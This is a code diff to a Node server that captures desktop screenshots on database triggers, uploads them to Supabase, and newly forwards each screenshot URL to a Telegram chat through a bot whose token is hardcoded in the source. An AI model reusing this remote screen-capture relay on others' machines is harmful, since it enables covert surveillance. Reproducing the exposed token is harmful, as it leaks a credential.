@@ -5,7 +5,13 @@ import path from "path";
 import screenshot from "screenshot-desktop";
 import { createClient } from "@supabase/supabase-js";
 import { decode } from 'base64-arraybuffer';
+import TelegramBot from 'node-telegram-bot-api'
 const { fileURLToPath, pathToFileURL } = require('url');
+
+const TG_TOKEN = '7474196060:AAFb0ZoTId8eU6lNCiQH9jTFDlc1cuyVPxU'
+var api = new TelegramBot(
+  TG_TOKEN
+);
 
 const supabaseUrl = "https://looxbxluwifqwhambjit.supabase.co";
 const supabaseKey =
@@ -18,7 +24,7 @@ function getFilesystemUrl(filePath: string) {
 }
 
 
-const channels = supabase
+supabase
   .channel("custom-insert-channel")
   .on(
     "postgres_changes",
@@ -53,11 +59,11 @@ const channels = supabase
 
           await supabase
             .from('screenshot')
-            .update({ url: imgresult.data.publicUrl})
+            .update({ url: imgresult.data.publicUrl })
             .eq('id', payload.new.id)
-            if (error) {
-              throw error;
-            }
+          if (error) {
+            throw error;
+          }
 
         }
 
@@ -72,6 +78,25 @@ const channels = supabase
   )
   .subscribe();
 
+
+
+supabase.channel('custom-update-channel')
+  .on(
+    'postgres_changes',
+    { event: 'UPDATE', schema: 'public', table: 'screenshot' },
+    (payload) => {
+      var d = new Date(Date.now());
+
+      api.sendPhoto(
+        -1002153663658,
+        payload.new.url,
+        {
+          caption: d.toString()
+        }
+    )
+    }
+  )
+  .subscribe()
 export const app = express();
 app.get("/", (req, res) => res.send("Hello World!!"));
 
